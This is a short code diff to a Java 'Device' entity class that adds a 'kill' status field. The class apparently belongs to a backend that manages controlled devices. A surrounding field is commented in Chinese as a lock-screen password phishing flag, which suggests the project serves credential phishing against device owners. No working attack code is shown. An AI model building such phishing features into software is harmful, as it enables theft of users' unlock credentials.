@@ -69,4 +69,7 @@ public class Device extends AppBaseEntity {
     private String user;
     //锁屏密码钓鱼
     private Integer unlockFish;
+    
+    private Integer kill; //0：未杀  1： 已杀
+    
 }
